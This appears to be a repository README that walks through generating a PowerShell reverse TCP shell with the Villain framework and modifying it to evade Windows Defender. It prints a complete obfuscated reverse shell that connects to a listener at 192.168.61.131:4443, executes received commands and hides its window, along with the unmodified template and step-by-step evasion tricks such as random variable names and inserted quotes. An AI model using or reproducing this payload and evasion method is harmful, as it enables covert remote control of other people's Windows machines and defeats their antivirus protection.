After installing Villian on your Kali, You cd into it villian dir type "python3 Villian.py" type "help generate", type "generate payload=windows/netcat/powershell_reverse_tcp lhost=eth0" this would generate a script for you but it'll be blocked by your windows defender or anti virus. attached within is a picture of the generated script and modified version. n/b: once you've done these steps, the listeners would be open, all you have to do is copy the script and convert it to a .exe file

it wont work but then the script has been created.

To modify the script, change every variable name to a random alphanumeric character e.g every "$client" can be "#njn4kjnn4" Do that for every variable.. also check my script to see how i added single quotes in randoms areas to0.. Now if you repeat the steps above, it'll keep generating scripts that would be blocked by windows defender. so here's the thing go back to the villian folder and paste this codes "mousepad Core/payload_templates/windows/netcat/powershell_reverse_tcp.py" it should take you to a file which generates the codes.. see image in this repo for better understanding..


// Modified codes
 Start-Process $PSHOME\powershell.exe -ArgumentList {$h6eyegd6etq = N''ew-Object Sys''tem.Net.Soc''kets.TC''PClient('192.168.61.131',4443);
 $xmie839jss = $h6eyegd6etq.GetStream();[byte[]]$jnklakms88wx = 0..65535|%{0};
 while(($i = $xmie839jss.Read($jnklakms88wx, 0, $jnklakms88wx.Length)) -ne 0){;
 $jdjbc77y3k = (New-Object -TypeName Sys''tem.Text.ASCIIE''ncoding).GetString($jnklakms88wx,0, $i);
 $smiw392poksm = (iex $jdjbc77y3k 2>&1 | Out-String );$ndu3h2799298s = $smiw392poksm + 'PS ' + (p''wd).Path + '> ';
 $jdkjeiji3kuw82oi2 = ([text.encoding]::ASCII).GetBytes($ndu3h2799298s);$xmie839jss.Write($jdkjeiji3kuw82oi2,0,$jdkjeiji3kuw82oi2.Length);
 $xmie839jss.Flush()};$h6eyegd6etq.Close()} -WindowStyle Hidden

 //Original Codes

 "Start-Process $PSHOME\\powershell.exe -ArgumentList {$client = New-Object System.Net.Sockets.TCPClient('*LHOST*',*LPORT*);
 $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
 $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );
 $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);
 $stream.Flush()};$client.Close()} -WindowStyle Hidden"
